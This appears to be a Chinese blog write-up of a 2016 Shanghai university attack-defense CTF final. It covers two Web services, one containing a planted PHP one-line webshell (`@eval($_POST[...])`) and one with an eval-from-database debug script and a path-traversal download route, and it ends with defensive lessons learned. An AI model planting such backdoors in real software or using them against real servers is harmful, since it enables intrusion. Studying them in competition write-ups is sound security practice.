---
title: 2016 全国大学生网络安全邀请赛暨第二届上海市大学生网络安全大赛决赛酱油记
authorId: rexskz
tags:
  - writeup
categories:
  - Writeup
date: 2016-11-28 11:43
---

这次比赛的形式跟暑假那次一样，也是攻防赛，选手需要维护三个服务，其中一个是二进制，两个是 Web。不过这次的网络跟上次的不一样，三个服务都处于选手自己的内网环境（172.16.9.X，每道题是一个 X）中，只对外网（172.16.5.X，X = 队名 + 9）暴露了必须的端口。不过思路还是一样，先把代码 Dump 下来，然后看看里面有什么漏洞，然后尝试利用。这次比赛不提供外网，而且只有四个小时（十分钟一轮），因此可能会困难一些。

我们队伍三个人，就我是搞 Web 的，剩下的两个学弟都是搞 PWN 的，因此果断让他俩去搞 PWN 了，我一个人慢慢看 Web。这篇文章就对这两道 Web 题逐题分析吧，最后再写写我踩过的坑，因为现场的时候，一道题卡住了就去做另一道，如果按照时间写的话可能会很乱。

# Web1

Web1 是搭在 Windows 2003 上的，需要远程桌面连接过去。打开 Web 目录之后发现两个项目，一个是开在 8081 上的 HDwiki，另一个是开在 8082 上的 finecms。我只看了 HDwiki 这一块，看到 `index.php` 里面第一句就是 `@eval($_POST['HDwiki'])`，这特么是个菜刀啊！然而我当时太傻逼，以至于没有用菜刀来验证，而是直接向其 post 各种各样的信息，结果发现均没法执行。在这儿耽误了好长时间，比赛结束后才想起来有可能是开了 WAF，如果是这样，那么普通的菜刀可能并不好使了，需要有绕过 WAF 功能的才可以。

# Web2

Web2 开了两个端口 8081 和 8082，然而看源码发现 8082 只有一个 `index.html` 文件，里面的内容就是 `8082`，所以这个端口是没意义的。把 8081 端口对应的文件下下来，发现是个 CodeIgniter 的项目。首先将 `ENVIRONMENT` 改成 `production`，然后在 `production` 中禁用全部的报错。然后在 `static/test-run/debug.php` 中发现了一段代码：

```php
$conn = @mysql_connect($db['default']['hostname'], $db['default']['username'], $db['default']['password']) or die("connect failed" . mysql_error());
@mysql_select_db($db['default']['database'], $conn);
$result = @mysql_query('select init from system', $conn);
eval('$system_info='.@mysql_fetch_row($result)[0].';');
echo "We are ".$system_info['owner'] ."<br>";
echo "Our taget is " .$system_info['taget']."<br>";
```

并搞不懂，不过可以看出来一点：它说数据库的 system 表中会有一个数据，于是看到 `system` 表，里面只有一个 `init` 字段，写了 `owner`，`member_key`，`taget`（居然不是 target），然而并没输出 `member_key`，可见其重要性。于是全局搜索一下，在 `application/controllers/Download.php` 中发现了这样一段：

```php
function do_download($file){
    force_download(APPPATH . pathcoder($file,$this->system_model->sys_select()['member_key']), NULL);
}
```

跳到 `force_download` 函数，发现它并没有检验传入的文件名，刚好 flag 相对于 `index.php` 的路径（`index.php` 是框架的单一入口）是 `../flag`，因此可以直接访问 `/download/do_download/xxx.html` 即可下载到 flag，其中 `xxx` 是经过加密后的 `../flag`。于是看到 `pathcoder` 函数：

```php
$ckey_length = 4;
$key = md5($key);
$keya = md5(substr($key, 0, 16));
$keyb = md5(substr($key, 16, 16));
// ....
```

只有解密算法，没有加密算法，这是让我们自己反推？然而这一串 md5……

愣了一会儿，突然反应过来，这段代码不就是 `uc_authcode`（`discuz` 中的对称加密算法）么？！对比了一下，跟 `uc_authcode` 的 `DECODE` 模式完全一样，当然，key 就是 `member_key` 了。然而我用 `uc_authcode` 加密之后却没法用 `pathcoder` 解密，不知道是什么情况，由于已经没有时间了，因此只能作罢。

# 踩过的坑

## 不要随便删文件

我一开始在 HDwiki 中看到了一个 `check.php`，与业务逻辑没有任何关系，只是查看文件 md5 的，因此就顺手将其重命名为 `check.php233` 了，结果我们的 Web1 被判定为 down，于是才知道这是主办方的存活检测（哪有这样做检测的啊），于是将其恢复之后就好了。

## 不要随便 die

我在 Web2 中发现了那个 `debug.php`，最下面有一个可能是变量覆盖的漏洞，我就在这之前添加了一句 `die();`，结果又被判定为 down 了……

## 不要随便改权限

之前想到 static 文件夹可能会有执行权限，于是我执行了 `chmod -x static`（嗯，没有递归），结果被判定为 down 了……然而我一直没反应过来（只想着 down 可能是文件哪里改坏了），因此导致我们 down 了 18 轮，基本全部的失分都是在这里。

## Web 可能有 WAF，可能有函数限制？

不光是 HDwiki 的那个菜刀用不了，我自己写的一些一句话也用不了。而且靶机中没有 tcpdump，于是我还想跟暑假一样在一开始输出 `$_SERVER['PHP_SELF']` 和全部的 header、body 来分析流量，然而不管是 `fwrite` 还是 `fputs` 甚至是 `file_put_contents` 都失效了。由于没有经验，所以我不知道是否还有别的抓流量的方法，这直接导致了我没法重放其它队伍的攻击流量（不然可以自己写个脚本得点分了）。

----

最终的结果是，我们由于防守的好（也可能是时间太短，其它漏洞都没人找到），只被 3years 打了一轮 Web1，剩下的失分都是因为 down。如果有上面这些经验的话，就不至于失掉那么多分，名次还会再往前进一波。

![0](https://dn-rexskz.qbox.me/blog/article/2016-shctf-final/0.png)
